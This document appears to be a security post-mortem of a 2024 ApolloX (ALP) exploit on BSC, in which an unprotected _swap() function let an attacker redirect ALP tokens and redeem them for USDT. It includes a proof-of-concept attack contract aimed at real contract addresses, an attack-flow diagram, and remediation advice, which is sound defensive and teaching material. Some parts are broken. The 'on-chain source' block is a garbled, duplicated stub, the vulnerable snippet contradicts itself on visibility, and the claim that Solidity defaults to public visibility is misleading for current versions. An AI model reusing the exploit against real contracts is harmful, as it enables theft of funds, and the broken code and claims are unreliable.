# ALP (ApolloX) — Missing Access Control on `_swap()` Enables Arbitrary Call Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | ApolloX (ALP) |
| **Chain** | BSC |
| **Loss** | ~$10,000 |
| **Attacker** | [0xff61Ba33](https://bscscan.com/address/0xff61Ba33Ed51322BB716EAb4137Adf985644b94d) |
| **Attack Contract** | [0x0edf13f6](https://bscscan.com/address/0x0edf13f6bd033f0f267d46c6e9dff9c7190e0fa0) |
| **Vulnerable Contract** | [VUN 0xD188492](https://bscscan.com/address/0xD188492217F09D18f2B0ecE3F8948015981e961a) |
| **ALP Token** | [0x9Ad45D46](https://bscscan.com/address/0x9Ad45D46e2A2ca19BBB5D5a50Df319225aD60e0d) |
| **Root Cause** | The `_swap()` function in the VUN contract lacks access control, allowing the attacker to encode their own address in the `unoswapTo` parameter to steal ALP tokens, then convert them to USDT via `redeem()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/ALP_exp.sol) |

---

## 1. Vulnerability Overview

The `_swap()` function in ApolloX's VUN contract is callable externally without any access control. By calling `_swap()` with crafted `unoswapTo` calldata that includes their own address as the recipient, the attacker was able to transfer ALP tokens held by the VUN contract to the attacker's address. The stolen ALP tokens were then converted to USDT via `redeem()` to realize the profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: _swap() has no access control
function _swap(
    address tokenIn,
    uint256 amountIn,
    bytes calldata swapData  // ← attacker manipulates unoswapTo data
) internal /* actually external */ returns (uint256) {
    // No msg.sender or owner validation
    (bool success,) = router.call(swapData);
    require(success);
    // recipient address inside swapData is set to the attacker's address
}

// ✅ Safe code: enforced as internal-only callable
function _swap(
    address tokenIn,
    uint256 amountIn,
    bytes calldata swapData
) internal returns (uint256) {  // internal — cannot be called externally
    // Additionally validate recipient inside swapData
    address recipient = extractRecipient(swapData);
    require(recipient == address(this), "invalid recipient");
    (bool success,) = router.call(swapData);
    require(success);
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: ALP_decompiled.sol
contract ALP {
contract ALP {
    address public owner;

}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Encode unoswapTo calldata
  │         └─ recipient = attacker's address
  │
  ├─→ [2] Call VUN._swap(ALP, amount, maliciousSwapData)
  │         └─ No access control → executes immediately
  │
  ├─→ [3] ALP tokens held by VUN → transferred to attacker's address
  │
  ├─→ [4] ALP.approve(redeem contract, amount)
  │
  ├─→ [5] Call redeem(RedeemData)
  │         └─ ALP → USDT conversion
  │
  └─→ [6] ~$10K USDT obtained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IVUN {
    function _swap(address tokenIn, uint256 amountIn, bytes calldata swapData) external returns (uint256);
}

interface IALP {
    function redeem(bytes calldata redeemData) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract AttackContract {
    IVUN  constant vun  = IVUN(0xD188492217F09D18f2B0ecE3F8948015981e961a);
    IALP  constant alp  = IALP(0x9Ad45D46e2A2ca19BBB5D5a50Df319225aD60e0d);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function testExploit() external {
        // [1] Encode attacker's address as recipient in unoswapTo data
        bytes memory swapData = encodeUnoswapTo(
            address(alp),
            alpBalance,
            address(this)  // recipient = attacker
        );

        // [2] Directly call _swap() which has no access control
        vun._swap(address(alp), alpBalance, swapData);

        // [3] Convert stolen ALP → USDT
        uint256 stolen = alp.balanceOf(address(this));
        alp.approve(address(alp), stolen);
        alp.redeem(encodeRedeemData(stolen));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (direct call to `_swap`) |
| **DApp Classification** | LP Token / DEX-integrated Contract |
| **Impact** | Theft of ALP tokens held by VUN |

## 6. Remediation Recommendations

1. **Enforce `internal` visibility**: Declare `_swap()` as `internal` to block direct external calls
2. **Validate recipient**: Verify that the recipient address within `swapData` is the contract itself
3. **Function naming conventions**: Enforce via coding standards that functions prefixed with `_` are internal-only
4. **Use static analysis tools**: Automatically detect `external` visibility on `_`-prefixed functions using tools like Slither

## 7. Lessons Learned

- The `_` prefix conventionally implies an internal function, but in Solidity, the default visibility is `public` if no visibility modifier is specified.
- Functions that accept swap data from external sources must restrict the recipient address to the contract itself.
- Patterns where logic intended to be internal is accidentally exposed externally must be caught with automated audit tooling.